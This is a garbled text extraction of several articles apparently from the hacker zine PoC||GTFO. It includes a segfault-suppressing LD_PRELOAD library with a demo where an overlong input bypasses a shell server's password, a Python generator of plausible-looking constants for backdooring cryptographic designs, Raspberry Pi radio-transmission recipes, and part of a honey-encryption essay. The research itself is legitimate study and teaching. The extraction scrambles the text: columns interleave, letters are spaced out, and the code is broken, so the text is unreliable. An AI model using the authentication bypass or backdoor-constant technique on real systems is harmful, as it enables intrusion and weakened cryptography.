clean up whatever caused the segfault, we’ll return from that segfault just to cause another segfault. In this
case, we simply increment the saved RIP register, and now we can safely return. The third argument that is
passed to the signal handler is a pointer to the user-level context struct that holds the saved context from
the exception.
1 void s e g f a u l t _ s i g a c t i o n ( i n t s i g n a l , s i g i n f o _ t ∗ s i , void ∗ p t r ) {
( ( u cont ext_ t ∗ ) p t r )−>uc_mcontext . g r e g s [REG_RIP]++;
3 }
Now just a little code to register this signal handler, and we’re good to go. In addition to SIGSEGV,
we’d better register SIGILL and SIGBUS. SIGILL is raised for illegal instructions, of which we’ll have many
since our On Error Resume Next handler may restart a multi-byte instruction one byte in. SIGBUS is used
for other types of memory errors (invalid address alignment, non-existent physical address, or some object
specific hardware errors, etc) so it’s best to register it as well.
1
3
5
7
9
struct s i g a c t i o n s a ;
memset(&sa , 0 , s i z e o f ( s i g a c t i o n ) ) ;
s i g e m p t y s e t (& s a . sa_mask ) ;
sa . sa_sigaction = s e g f a u l t _ s i g a c t i o n ;
sa . sa_flags
= SA_SIGINFO ;
s i g a c t i o n (SIGSEGV , &sa , NULL) ;
s i g a c t i o n ( SIGILL , &sa , NULL) ;
s i g a c t i o n (SIGBUS , &sa , NULL) ;
In order to help out the users of buggy software, I’ve included this code as a shared library that registers
these handlers upon loading. If your developers are too busy to deal with handling errors or fixing bugs,
then this project may be for you. To use this code, simply load the library at runtime with the LD_PRELOAD
environment variable, such as the following:
1 $ LD_PRELOAD=./ l i b o e r n . s o . / l o g i n
Be wary though, this may lead to some unexpected behavior. The attached example shell server illustrates
this, but can you figure out why it happens? 51
1 $ nc l o c a l h o s t 5555
P l e a s e e n t e r t h e password :
3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
,→
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
5 Password c o r r e c t , s t a r t i n g a c c e s s s h e l l . . .
51 unzip
pocorgtfo08.pdf onerror.zip #Beware of spoilers!
45469
Unbrick My Part
by EVM and Tommy Brixton
(no relation to Toni Braxton)
Don’t leave me stuck in this state
Back out the changes you made
Restore and cycle my power
Take these double faults away
I need you to reflash me now
My screen just won’t come on
Please hold me now, use and operate me
Unbrick my part
Flash my ROM on again
Undo the damage you caused
When you jacked up my image and wrote it back on
Un-ice this freeze
I crashed so many times
Unbrick my part
My part
Restore my interrupt table
Fix up my volume labels
My debug registers are filling with tears
Come and clear these bugs away
My checksums are all broken
My CRCs are bad
And life is so cruel without you to operate me
Unbrick my part
Flash my ROM on again
Undo the damage you caused
When you jacked up my image and wrote it back on
Un-ice this freeze
I crashed so many times
Unbrick my part
My part
Don’t leave me stuck in this state
Back out the changes you made
Please hold me now, use and operate me
4710
Backdoors up my Sleeve
by JP Aumasson
SHA-1 was designed by the NSA and uses
the constants 5a827999, 6ed9eba1, 8f1bbcdc, and
ca62c1d6. In case you haven’t already noticed,
these are hex representations of 2 30 times the square
roots of 2, 3, 5, and 10.
NIST’s P-256 elliptic curve was also designed by
the NSA and uses coefficients derived from a hash of
the seed c49d3608 86e70493 6a6678e1 139d26b7
819f7e90. Don’t look for decimals of square roots
here; we have no idea where this value comes from.
Which algorithm would you trust the most?
Right, SHA-1. We don’t know why 2, 3, 5, 10 rather
than 2, 3, 5, 7, or why the square root rather than
the logarithm, but this looks more convincing than
some unexplained random-looking
√ number.
Plausible constants such as 2 are often called
“nothing-up-my-sleeve” (NUMS) constants, mean-
ing that there is a kinda-convincing explanation of
their origin. But it isn’t impossible to backdoor an
algorithm with only NUMS constants, it’s just more
difficult.
There are basically two ways to create a NUMS-
looking backdoored algorithm. One must either (1)
bruteforce NUMS constants until one matches the
backdoor conditions or (2) bruteforce backdoor con-
stants until one looks NUMS.
The first approach sounds easier, because brute-
forcing backdoor constants is unlikely to yield a
NUMS constant, and besides, how do you check that
some constant is a NUMS? Precompute a huge table
and look it up? In that case, you’re better off brute-
forcing NUMS constants directly (and you may not
need to store them). But in either case, you’ll need
a lot of NUMS constants.
I’ve been thinking about this a lot after my re-
search on malicious hash functions. So I set out
to write a simple program that would generate a
huge corpus of NUMS-ish constants, to demonstrate
to non-cryptographers that “nothing-up-my-sleeve”
doesn’t give much of a guarantee of security, as
pointed out by Thomas Pornin on Stack Exchange.
The numsgen.py program generates nearly two
million constants, while I’m writing this. 52 Noth-
ing new nor clever here; it’s just about exploiting
degrees of freedom in the process of going from a
plausible seed to actual constants. In that PoC pro-
gram, I went for the following method:
1. Pick a plausible seed
2. Encode it to a byte string
3. Hash it using some hash function
4. Decode the hash result to the actual constants
Each step gives you some degrees of freedom, and
the game is to find somewhat plausible choices.
As I discovered after releasing this, DJB and oth-
ers did a similar exercise in the context of manip-
ulated elliptic curves in their “BADA55 curves” pa-
per, 53 though I don’t think they released their code.
Anyway, they make the same point: “The BADA55-
VPR curves illustrate the fact that ‘verifiably pseu-
dorandom’ curves with ‘systematic’ seeds generated
from ‘nothing-up-my-sleeve numbers’ also do not
stop the attacker from generating a curve with a
one-in-a-million weakness.” The two works obvi-
ously overlap, but we use slightly different tricks.
10.1
Seeds
We want to start from some special number, or,
more precisely, √
one √
that √ will √ look special. We cited
SHA-1’s use of 2, 3, 5, 10, but we could have
cited
· π used in ARIA, BLAKE, Blowfish,
· MD5 using “the integer part of 4294967296 ×
abs(sin(i))”,
· SHA-1 using 0123456789abcdeffedcba98-
76543210f0e1d2c3,
· SHA-2 using square roots and cube roots of
the first primes,
· NewDES using the US Declaration of Indepen-
dence,
· Brainpool curves using SHA-1 hashes of π and
e.
52 https://github.com/veorq/numsgen
unzip pocorgtfo08.zip numsgen.py
53 http://safecurves.cr.yp.to/bada55.html
48We thus have six primes combined with seven
functions mapping them to irrationals, plus six ir-
rationals, for a total of 48 numbers. Multiplying
by twelve different precisions, that’s 576 irrationals.
For each of those, we also take the multiplicative in-
verse. For the one of the two that’s greater than one,
we also take the fractional part (thus stripping the
leading digit from the significant digits). We thus
have in total 3 × 576 = 1728 seeds.
Note that seeds needn’t be numerical values.
They can be anything that can be hashed, which
means pretty much anything: text, images, etc.
However, it may be more difficult to explain why
your seed is a Word document or a PCAP than if
it’s just raw numbers or text.
Special numbers may thus be universal math
constants such as π or e, or some random-looking
sequence derived from a special number: small inte-
gers such as 2, 3, 5, or some number related to the
design (like the closest prime number to the security
level), or the designer’s birthday, or his daughter’s
birthday, etc.
For most numbers, functions like the square root
or trigonometric functions yield an irrational num-
ber, namely one that can’t be expressed as a frac-
tion, and with an infinite random-looking decimal
expansion. This means that we have an infinite
number of digits to choose from!
Let’s now enumerate some NUMS numbers. Ob-
viously, what looks plausible to the average user may
not be so for the experienced cryptographer, so the
notion of “plausibility” is subjective. Below we’ll re-
strict ourselves to constants similar to those used in
previous designs, but many more could be imagined
(like physical universal constants, text rather than
numbers, etc.). In fact, we’ll even restrict
√ ourselves
to irrational numbers: π, e, φ = (1 + 5)/2 (the
golden ratio), Euler–Mascheroni’s γ, Apéry’s ζ(3)
constant, and irrationals produced from integers by
the following functions
10.2
Cryptographers aren’t known for being good pro-
grammers, so we can plausibly deny an awkward en-
coding of the seeds. The PoC tries the obvious raw
bytes encoding, but also ASCII of the decimal, hex
(lower and upper case), or even binary digits (with
and without the 0b prefix). It also tries Base64 of
raw bytes, or of the decimal integer.
To get more degrees of freedom you could use
more exotic encodings, add termination characters,
timestamps, and so on, but the simpler the better.
· Natural logarithm, ln(x), irrational for any ra-
tional x > 1;
· Decimal logarithm, log(x), irrational unless
x = 10 n for some integer n;
· Square root,
fect square;
· Cubic root,
cube;
√
√
3
10.3
x, irrational unless x is a perfect
We’ll feed these functions with the first six
primes: 2, 3, 5, 7, 11, 13. This guarantees that
all these functions will return irrationals.
Now that we have a bunch of irrationals, which
of their digits do we record? Since there’s an infinite
number of them, we have to choose. Again, this pre-
cision must be some plausible number. That’s why
this PoC takes the first N significant digits—rather
than just the fractional part—for the following val-
ues of N : 42, 50, 100, 200, 500, 1000, 32, 64, 128,
256, 512, and 1024.
Hashes
The purpose of hashing to generate constants is at
least threefold.
1. Ensure that the constant looks uniformly ran-
dom, that it has no symmetries or structure. This
is, for example, important for the hash functions’
initial values. Hash functions can thus “sanitize”
similar NUMS by produce completely different con-
stants:
x, irrational unless x is a per-
· Trigonometric functions: sine, cosine, and tan-
gent, irrational for all non-zero integers.
Encodings
1 >>> hex ( i n t ( math . tanh ( 5 ) ∗ 1 0 ∗ ∗ 1 6 ) )
' 0 x23861f0946f3a0 '
3 >>> sha1 (_) . h e x d i g e s t ( )
' b96cf4dcd99ae8aec4e6d0443c46fe0651a44440 '
5 >>> hex ( i n t ( math . tanh ( 7 ) ∗ 1 0 ∗ ∗ 1 6 ) )
' 0 x2386ee907ec8d6 '
7 >>> sha1 (_) . h e x d i g e s t ( )
' 7 c25092e3fed592eb55cf26b5efc7d7994786d69 '
2. Reduce the length of the number to the size of
the constant. If your seed is the first 1000 digits of
π, how do you generate a 128-bit value that depends
on all the digits?
493.
Give the impression of “cryptographic
strength”. Some people associate the use of cryptog-
raphy with security and confidence, and may believe
that constants generated with SHA-3 are safer than
constants generated with SHA-1.
Obviously, we want a cryptographic hash rather
than some fast-and-weak hash like CRC. A natural
choice is to start with MD5, SHA-1, and the four
SHA-2 versions. You may also want to use SHA-3
or BLAKE2, which will give you even more degrees
of freedom in choosing their version and parameters.
Rather than just a hash, you can use a keyed
hash. In my PoC program, I used HMAC–MD5 and
HMAC–SHA1, both with 3 × 3 combinations of the
key length and value.
Another option, with even more degrees of free-
dom, is a key derivation—or password hashing—
function. My PoC applies PBKDF2–HMAC–SHA1,
the most common instance of PBKDF2, with: either
32, 64, 128, 512, 1024, 10, 100, or 1000 iterations; a
salt of 8, 16, or 32 bytes, either all-zero or all-ones.
That’s 48 versions.
The PoC thus tries 6 + 18 + 48 = 72 different
hash functions.
10.4
128 bits from the hash and parse them either as big-
or little-endian.
10.5
Conclusion
That’s all pretty simple, and you could argue that
some choices aren’t that plausible (e.g., binary en-
coding). But that kind of thing would be enough
to fool many, and most would probably give you
the benefit of the doubt. After all, only some
pesky cryptographers object to NIST’s unexplained
curves.
So with 1728 seeds, 8 encodings, 72 hash func-
tion instances, and 2 decodings, we have a total of
1728×8×72×2 = 1, 990, 656 candidate constants. If
your constants are more sophisticated objects than
just 32-bit words, you’ll likely have many more de-
grees of freedom to generate many more constants.
This demonstrates that any invariant in a crypto
design—constant numbers and coefficients, but also
operations and their combinations—can be manip-
ulated. This is typically exploited if there exists a
one in a billion (or any reasonably low-probability)
weakness that’s only known to the designer. Var-
ious degrees of exclusive exploitability (“NOBUS”)
may be achieved, depending on what’s the secret:
just the attack technique, or some secret value like
in the malicious SHA-1.
The latest version of the PoC is copied below.
You may even use it to generate non-malicious con-
stants.
Decoding
Decoding of the hashes to actual constants depends
on what constants you want. In this PoC I just
want four 32-bit constants, so I only take the first
#! / u s r / b i n / env python
2 #h t t p s : // g i t h u b . com/ v e o r q /numsgen
"""
4 G e n e r a t o r o f " n o t h i n g −up−my−s l e e v e " (NUMS) c o n s t a n t s .
6 This aims t o d e m o n s t r a t e t h a t NUMS −l o o k i n g c o n s t a n t s s h o u l d n ' t be
blindly trusted .
8
This program may be used t o b r u t e f o r c e t h e d e s i g n o f a m a l i c i o u s c i p h e r ,
10 t o c r e a t e somewhat r i g i d c u r v e s , e t c . I t g e n e r a t e s c l o s e t o 2 m i l l i o n
c o n s t a n t s , and i s e a s i l y tweaked t o g e n e r a t e many more .
12
The code below i s p r e t t y much s e l f −e x p l a n a t o r y . P l e a s e r e p o r t bugs .
14
See a l s o <h t t p : / / s a f e c u r v e s . c r . yp . t o / bada55 . html>
16
C o p y r i g h t ( c ) 2015 Jean−P h i l i p p e Aumasson <j e a n p h i l i p p e . aumasson@gmail . com>
18 Under CC0 l i c e n s e <h t t p : / / c r e a t i v e c o m m o n s . o r g / p u b l i c d o m a i n / z e r o /1.0/ >
"""
20
from b a s e 6 4 i mpo rt b64encode
22 from b i n a s c i i imp or t u n h e x l i f y
from i t e r t o o l s im po rt p r o d u c t
24 from struct im por t unpack
50from Crypto . Hash i mp ort HMAC, MD5, SHA, SHA224 , SHA256 , SHA384 , SHA512
26 from Crypto . P r o t o c o l .KDF im po rt PBKDF2
im por t mpmath a s mp
28 i mp ort s y s
30
# add your own s p e c i a l p r i m e s
32 PRIMES = ( 2 , 3 , 5 , 7 , 1 1 , 1 3 )
34 PRECISIONS = (
42 , 50 , 100 , 200 , 500 , 1000 ,
36
32 , 64 , 128 , 256 , 512 , 1024 ,
)
38
# s e t mpmath p r e c i s i o n
40 mp . mp . dps = max(PRECISIONS)+2
42 # some p o p u l a r to−i r r a t i o n a l t r a n s f o r m s ( beware e x c e p t i o n s )
TRANSFORMS = (
44
mp . ln , mp . l o g 1 0 ,
mp . s q r t , mp . c b r t ,
46
mp . cos , mp . s i n , mp . tan ,
)
48
50 IRRATIONALS = [
mp . phi ,
52
mp . pi ,
mp . e ,
54
mp . e u l e r ,
mp . apery ,
56
mp . l o g (mp . p i ) ,
] +\
58 [ abs ( t r a n s f o r m ( prime ) ) \
f o r ( prime , t r a n s f o r m ) i n p r o d u c t (PRIMES, TRANSFORMS) ]
60
SEEDS = [ ]
62 f o r num i n IRRATIONALS :
i n v = 1/num
64
s e e d 1 = mp . n s t r (num , mp . mp . dps ) . r e p l a c e ( ' . ' , ' ' )
s e e d 2 = mp . n s t r ( inv , mp . mp . dps ) . r e p l a c e ( ' . ' , ' ' )
66
f o r p r e c i s i o n i n PRECISIONS :
SEEDS . append ( s e e d 1 [ : p r e c i s i o n ] )
68
SEEDS . append ( s e e d 2 [ : p r e c i s i o n ] )
i f num >= 1 :
70
s e e d 3 = mp . n s t r (num , mp . mp . dps ) . s p l i t ( ' . ' ) [ 1 ]
f o r p r e c i s i o n i n PRECISIONS :
72
SEEDS . append ( s e e d 3 [ : p r e c i s i o n ] )
continue
74
i f i n v >= 1 :
s e e d 4 = mp . n s t r ( inv , mp . mp . dps ) . s p l i t ( ' . ' ) [ 1 ]
76
f o r p r e c i s i o n i n PRECISIONS :
SEEDS . append ( s e e d 4 [ : p r e c i s i o n ] )
78
80 # some common e n c o d i n g s
def int10 (x) :
82
return x
84 d e f i n t 2 ( x ) :
return b i n ( i n t ( x ) )
86
def int2_noprefix (x) :
88
return b i n ( i n t ( x ) ) [ 2 : ]
5190 d e f hex_lo ( x ) :
xhex = '%x ' % i n t ( x )
92
i f l e n ( xhex ) % 2 :
xhex = ' 0 ' + xhex
94
return xhex
96 d e f hex_hi ( x ) :
xhex = '%X ' % i n t ( x )
98
i f l e n ( xhex ) % 2 :
xhex = ' 0 ' + xhex
100
return xhex
102 d e f raw ( x ) :
return hex_lo ( x ) . d e co de ( ' hex ' )
104
d e f base64_from_int ( x ) :
106
return b64encode ( x )
108 d e f base64_from_raw ( x ) :
return b64encode ( raw ( x ) )
110
ENCODINGS = (
112
int10 ,
int2 ,
114
int2_noprefix ,
hex_lo ,
116
hex_hi ,
raw ,
118
base64_from_int ,
base64_from_raw ,
120 )
122
d e f do_hash ( x , ahash ) :
h = ahash . new ( )
h . update ( x )
126
return h . d i g e s t ( )
124
128 d e f do_hmac ( x , key , ahash ) :
h = HMAC. new ( key , d i g e s t m o d=ahash )
130
h . update ( x )
return h . d i g e s t ( )
132
HASHINGS = [
134
lambda x : do_hash ( x , MD5) ,
lambda x : do_hash ( x , SHA) ,
136
lambda x : do_hash ( x , SHA224 ) ,
lambda x : do_hash ( x , SHA256 ) ,
138
lambda x : do_hash ( x , SHA384 ) ,
lambda x : do_hash ( x , SHA512 ) ,
140 ]
142 # HMACs
f o r h f i n (MD5, SHA) :
144
f o r k e y b y t e i n ( ' \ x55 ' , ' \ xaa ' , ' \ x f f ' ) :
for keylen in (16 , 32 , 64) :
146
HASHINGS . append ( lambda x , \
h f=hf , k e y b y t e=keybyte , k e y l e n=k e y l e n : \
148
do_hmac ( x , k e y b y t e ∗ k e y l e n , h f ) )
150 # PBKDF2s
for n in (32 , 64 , 128 , 512 , 1024 , 10 , 100 , 1000) :
152
f o r s a l t b y t e i n ( ' \ x00 ' , ' \ x f f ' ) :
for s a l t l e n in (8 , 16 , 32) :
154
HASHINGS . append ( lambda x , \
52n=n , s a l t b y t e=s a l t b y t e , s a l t l e n=s a l t l e n : \
PBKDF2( x , s a l t b y t e ∗ s a l t l e n , count=n ) )
156
158
160
162
164
166
168
170
DECODINGS = (
lambda h : (
unpack (
unpack (
unpack (
unpack (
lambda h : (
unpack (
unpack (
unpack (
unpack (
)
'>L '
'>L '
'>L '
'>L ' ,
,
,
, h [:4]) [0] ,
h[4:8]) [0] ,
h[8:12]) [0] ,
h[12:16]) [0] ,) ,
'<L '
'<L '
'<L '
'<L ' ,
,
,
, h [:4]) [0] ,
h[4:8]) [0] ,
h[8:12]) [0] ,
h[12:16]) [0] ,) ,
172
MAXNUMS =\
l e n (SEEDS) ∗\
l e n (ENCODINGS) ∗\
176
l e n (HASHINGS) ∗\
l e n (DECODINGS)
178
174
180 d e f main ( ) :
try :
182
nbnums = i n t ( s y s . a r g v [ 1 ] )
i f nbnums > MAXNUMS:
184
r a i s e ValueError
except :
186
p r i n t ' e x p e c t e d argument < %d (~2^%.2 f ) ' \
% (MAXNUMS, mp . l o g (MAXNUMS, 2 ) )
188
return −1
count = 0
190
f o r se ed , e n c o d i n g , h a s h i n g , d e c o d i n g i n \
192
p r o d u c t (SEEDS , ENCODINGS, HASHINGS, DECODINGS) :
194 constants = decoding ( hashing ( encoding ( seed ) ) )
196 for constant in constants :
s y s . s t d o u t . w r i t e ( ' %08x ' % c o n s t a n t )
print
count += 1
i f count == nbnums :
return count
198
200
202
204 i f __name__ == '__main__ ' :
s y s . e x i t ( main ( ) )
535411
Naughty Signals; or, the Abuse of a Raspberry Pi
by Russell Handorf
There are a lot of different projects that have
rejuvenated interest in HAM Radio, more notably
Software Defined Radio (SDR). The more promi-
nent projects and products are the USRP by Ettus
Research, BladeRF by Nuand, and the HackRF by
Mike Ossmann (in the order from the most expen-
sive to least expensive). These radios vary in capa-
bility and have their own distinct utility, depending
on what radio communication you’d like to study;
however, if all you are specifically interested in is re-
ceiving a simplistic signal, then the Realtek SDR is
typically the best and cheapest choice. This article
will show you how to combine a Realtek SDR and
a Raspberry Pi into a poor man’s software defined
radio tool for exploring how to receive and transmit
in related radio systems.
11.1
1 #/ b i n / bash
#pi −shutdown . sh
3 touch /tmp/empty && /home/ p i / pifm /tmp/empty
Bandpass Filter
It is very important to have and to use a band-
pass filter when using the Raspberry Pi as an FM
transmitter, because PiFM is essentially a square
wave generator. This means that you’ll have a lot
of harmonics as depicted in Figure 21. While the
direct operational frequency range of PiFM is ap-
proximately 1 MHz to 250 MHz, the harmonics are
still strong enough to reach frequencies below 1 MHz
and as high as 500 MHz.
Because of these square wave characteristics, a
mechanical SAW filter would be ideal to be able to
control the frequencies you wish to transmit. How-
ever, there filters can set you back more than the
Raspberry Pi, and may be hard to come by, unless
there’s a neighborly Ham Radio Outlet near you. So
you may have to make your own band-pass filter.
To make your own high band and/or low band
pass filters, you can assemble them based on the
schematic in Figure 19. 54 Parts for the various am-
ateur bands are listed in Figure 20.
11.2
code that generated spread-spectrum clock signals
to output FM on GPIO pin #4. Oliver Mattos and
Oskar Weigl have since enhanced PiFM to add more
capabilities.
Be aware, however, that this technique has an-
other problem beyond bleeding RF and having to
use filters. Namely, the transmitter doesn’t shut
down gracefully after you quit PiFM. Therefore,
you’ll need a script to silence the transmission. We’ll
call it pi-shutdown.sh in the various examples that
follow.
Raspberry Pi FM Transmitter
11.3
AFSK
Audio Frequency Shift Keying (AFSK) is simply
a method to modulate digital data as an analogue
tone; you’ll certainly recognize this as the tones your
modem made. AFSK characteristically represents 1
as a “mark” and 0 as a “space”. While not fast,
AFSK does work very well in many applications
where data is communicated over a consistent radio
frequency. Because of these attributes, AFSK is fre-
quently used for radio communications in industrial
applications, embedded systems, and more. Using
a program called minimodem, you’ll be easily able
to receive and transmit AFSK with a Realtek SDR
and a Raspberry Pi. Marc1 from kprod.eu demon-
strated some very simple techniques for doing so,
which a few other neighbors have been tweaked and
updated in the examples to follow.
To receive 1200 baud AFSK transmissions, a
one-line script is all that’s needed:
1 rtl_fm −f 1 4 6 . 0M − M wbfm −s 200000
−r 48000 −o 6
3 | s o x −traw −r 4 8 k −e s −b16 −c1 −V1 −
−twav −
5 | minimodem −−r x −8 1200
For over a year now, it has been documented how
to turn the Raspberry Pi into an FM transmitter
by using the PiFM software. 55 Richard Hirst first
demonstrated this technique in some C and Python
\
\
\
\
What’s happening here is that the program
rtl_fm is tuned to 146.0 MHz, sampling at 200,000
54 http://www.kitsandparts.com/univlpfilter.php
55 https://github.com/rm-hull/pifm
55samples per second and converting the output at a
sample rate of 48000 Hz. The output from this is
sent to sox, which is converting the audio received
to the WAV file format. The output from sox is
then sent to minimodem, which is decoding the WAV
stream at 1200 baud, 8 bit ASCII.
Transmitting an AFSK signal is just as easy:
1 echo " knock knock . . . : ` d a t e +%c ` "
| minimodem −−t x −f −8 1200
3
−f /home/ p i / s e n t e n c e . wav
/home/ p i / pifm /home/ p i / s e n t e n c e . wav
5
1 4 6 . 0 48000
/home/ p i / pi −shutdown . sh
11.4
Numbers Station
A numbers station is typically a government-owned
transmitter that sends encoded messages to spies,
operators, or employees of that said government
anywhere in the world, where the messages are typ-
ically one way and seemingly random. The script
below mimics the Cuban numbers station identified
as HM01. 57 What is interesting about it is that the
data it sends is encoded with a common HAM Ra-
dio protocol called RDFT. Transmitting RDFT on a
Raspberry Pi can be difficult, therefore using a sim-
ple FM transmission of THOR8 or QPSK256 should
be adequate; using FLDIGI should be of great help
to create these messages.
A script can easily speak a series of words into
the air by piping them into the text2wave utility:
\
\
\
Other Transmission Examples
Because of the scriptability and simplicity of PiFM,
other forms of transmissions become easily achiev-
able too.
2
system ( " echo $ t e x t | t e x t 2 w a v e −F 22050 − "
" | /home/ p i / pifm − 144 22050 " ) ;
Morse Code (CW)
Either done by playing a pre-made audio file with
dits and dahs, or by using the cwwav program
written by Thomas Horsten to output directly to
PiFM. 56
echo h e l l o world
2 | cwwav −f 700 −w 20
−o /home/ p i / morse . wav
4 /home/ p i / pifm /home/ p i / morse . wav
1 4 6 . 0 48000
6 /home/ p i / pi −shutdown . sh
DVBT with Metadata
One common practice for those who work with the
RTL dongle is to remove to remove the DVB-T
digital television kernel module. To receive this
challenge, however, you will need to re-enable that
module. To transmit it, you’ll need hardware from
Hides, 58 which can be had for a very low cost. The
script below works with the UT-100C.
\
\
\
56 https://github.com/Kerrick/cwwav
57 http://www.qsl.net/py4zbz/eni.htm
58 http://www.hides.com.tw/product_cg74469_eng.html
Figure 19: Bandpass Filter for Reducing PiFM Harmonics
562
4
6
8
10
12
14
16
modprobe usb−i t 9 5 0 x
m k f i f o ~/ d e s k t o p
avconv −f x11grab −s 1024 x768
−f r a m e r a t e 30 − i : 0 . 0
−v c o d e c l i b x 2 6 4 −s 720 x576
−f mpegts
−mpegts_original_network_id 1
−mpegts_transport_stream_id 1
−m p e g t s _ s e r v i c e _ i d 1
−metadata
s e r v i c e _ p r o v i d e r="FCC CALL SIGN"
−metadata
service_name=" D i a l i n f o r D o l l a r s ! "
−muxrate 3732 k −y ~/ d e s k t o p &
t s r f s e n d ~/ d e s k t o p 0 730000 6000 4
1/2 1/4 8 0 0 &
out the need for a graphical environment.
\
\
\
\
\
\
\
\
\
\
\
11.5
Thanks to the PiFM program, there are many
portable options allowing HAM operators, experi-
menters, and miscreants to explore and butcher the
radio waves on the cheap. The main goal of this ar-
ticle is to document the work of many friendly folks
in this arena, gathering in one place the information
currently scattered across the bits and bobs of the
Internet. Owing to the brilliant hacks of these neigh-
bors, it should become apparent why any radio nut
should consider having a Raspberry Pi armed with
a filter and some code. While out of scope for the
article, it should also become clear how you too can
make a very inexpensive and portable HAM station
for a large variety of digital and analog modes.
I’d like to extend a warm, hearty, and, even-
tually, beer-supplemented thank-you to Dragorn,
Zero_Chaos, Rick Mellendick, DaKahuna, Justin
Simon, Tara Miller, Mike Ossmann, Rob Ghilduta,
and Travis Goodspeed for their direct support.
\
SSTV
Gerrit Polder developed a simple means of convert-
ing an image into a SSTV signal and then sending
it out via the PiFM utility. Using his program, PiS-
STV, command line transmissions of SSTV broad-
casts with the Raspberry Pi are easy to achieve with-
Band
λ Meters
160
80
40
30
20
17
15
12
10
C1, C4 C2, C3
820
470
270
270
180
100
82
100
56 2200
1200
680
560
390
270
220
220
150
Howdy to the caring Neighbors
L1, L3 L2
4.44μH, 20T, 16 00
2.43μH, 21T, 16 00
1.38μH, 18T, 14 00
1.09μH, 16T, 12 00
0.77μH, 13T, 11 00
0.55μH, 11T, 9 00
0.44μH, 11T, 9 00
0.44μH, 11T, 9 00
0.30μH, 9T, 8 00 5.61μH, 23T, 18 00
3.01μH, 24T, 18 00
1.70μH, 20T, 15 00
1.26μH, 17T, 13 00
0.90μH, 14T, 11 00
0.68μH, 12T, 10 00
0.56μH, 12T, 10 00
0.52μH, 12T, 10 00
0.38μH, 10T, 9 00
Figure 20: Filter Bill of Materials
57Figure 21: PiFM Harmonic Emissions
585912
Weird cryptography; or,
How to resist brute-force attacks.
by Philippe Teuwen
“Unbreakable, sir?” she said uneasily. “What about the Bergofsky Principle?”
Susan had learned about the Bergofsky Principle early in her career. It was a cornerstone of brute-
force technology. It was also Strathmore’s inspiration for building TRANSLTR. The principle
clearly stated that if a computer tried enough keys, it was mathematically guaranteed to find the
right one. A code’s security was not that its pass-key was unfindable but rather that most people
didn’t have the time or equipment to try.
Strathmore shook his head. “This code’s different.”
“Different?” Susan eyed him askance. An unbreakable code is a mathematical impossibility! He
knows that!
Strathmore ran a hand across his sweaty scalp. “This code is the product of a brand new encryption
algorithm—one we’ve never seen before.”
[...]
“Yes, Susan, TRANSLTR will always find the key—even if it’s huge.” He paused a long moment.
“Unless. . . ”
Susan wanted to speak, but it was clear Strathmore was about to drop his bomb. Unless what?
“Unless the computer doesn’t know when it’s broken the code.”
Susan almost fell out of her chair. “What!”
“Unless the computer guesses the correct key but just keeps guessing because it doesn’t realize it
found the right key.” Strathmore looked bleak. “I think this algorithm has got a rotating cleartext.”
Susan gaped.
The notion of a rotating cleartext function was first put forth in an obscure, 1987 paper by a
Hungarian mathematician, Josef Harne. Because brute-force computers broke codes by examining
cleartext for identifiable word patterns, Harne proposed an encryption algorithm that, in addition
to encrypting, shifted decrypted cleartext over a time variant. In theory, the perpetual mutation
would ensure that the attacking computer would never locate recognizable word patterns and thus
never know when it had found the proper key.
Yes, we are in a pure sci-fi techno-thriller. Some of you may have recognized this excerpt from the Digital
Fortress by Dan Brown, published in 1998. Not surprisingly, there is no such thing as the concept of rotating
cleartext or Bergofsky Principle, and Josef Harne never existed.
There is still a germ of an interesting idea: What if “the computer guesses the correct key but just keeps
guessing because it doesn’t realize it found the right key”? Instead of trying to conceal plaintext in yet
another layer of who-knows-what, let’s try to make the actual plaintext indistinguishable from incorrectly
decoded ciphertext. It would be a bit similar to format-preserving encryption (FPE) 59 where ciphertext
looks similar to plaintext and honey encryption, 60 which both share the motivation to resist brute-force.
But beyond single words and passwords, I want to encrypt full sentences. . . into other grammatically correct
sentences! Now if Eve wants to brute-force such an encrypted message, every single wrong key would produce
a somehow plausible sentence. She would have to choose amongst all “decrypted” plaintext candidates for
the one that was my initial sentence.
So starts a war of natural language models. . . Anything the cryptanalyst can find to discard a candidate
can be used in turn to tune the initial grammar model to create more plausible candidates. The problem
59 https://en.wikipedia.org/wiki/Format-preserving_encryption
60 http://pages.cs.wisc.edu/
rist/papers/HoneyEncryptionpre.pdf
60for the cryptanalyst C can be expressed as a variation of the Turing test, where the test procedure is not a
dialog but consists of presenting n texts, of which n − 1 were produced by a machine A, and only one was
written by a human B (cf. Fig. 22.)
Figure 22: Turing test, our way.
We’ll start with a mapping between sentences and their numerical representations. Let’s represent a
language by a graph. Each sentence is one path through the language graph. Taking another random
path will lead to another grammatically correct sentence. To encrypt a message, the first step is to encode
it as a description of the path through the grammar graph. This path has to be identified numerically
(enumerated) among the possible paths. Ideally, the enumeration must be balanced by the frequency of
common grammatical constructions and vocabulary, something you get more or less for free if you manage
to map some Huffman coding onto it. If there is a complete map between all the paths up to a given length
and a bounded set of integers, then we have the guarantee that any random pick in the set will be accepted
by the deciphering routine and will lead to a grammatically correct sentence. So the numerical representation
can now be ciphered by any classic symmetric cipher.
A complete solution has to follow a few additional rules. It must not include any metadata that would
confirm the right key when brute-forced, so e.g., it shouldn’t introduce any checksum over the plaintext that
could be used by an attacker to validate candidates! And any wrong key should lead to a proper deciphering
and a valid sentence, no exception.
Such encoding method covering a balanced language graph could serve as a basis for a pretty cool natural
language text compressor, which works a bit like ordering the numbers 3, 10, and 12 in a Chinese restaurant.
(I recommend the 12.)
In practice, some junk can be tolerated in the brute-forced candidates; in fact, even a lot of junk could
be fine! For example, 99% of detectable junk would lead to a loss of just 6.6 bits of key material.
12.1
Enough talk. Show me a PoC or you-know-what!
Fair enough.
We need to parse English sentences, so a good starting point may be grammar checkers:
$ apt - cache show link - grammar
Description - en : Carnegie Mellon University ' s link grammar parser
In Selator , D . and Temperly , D . " Parsing English with a Link
Grammar " (1991) , the authors defined a new formal grammatical system
called a " link grammar ". A sequence of words is in the language of a
link grammar if there is a way to draw " links " between words in such a
way that the local requirements of each word are satisfied , the links
do not cross , and the words form a connected graph . The authors
encoded English grammar into such a system , and wrote this program to
parse English using this grammar .
61link-grammar sounds like a good tool to play with.
Here is, for example, how it parses a quote from Jesse Jackson: “I take my role seriously as a pastor”.
+ - - - - - - - - - - - MVp - - - - - - - - - - -+
+ - - - - - - - MVa - - - - - - -+
|
+ - - - - Os - - -+
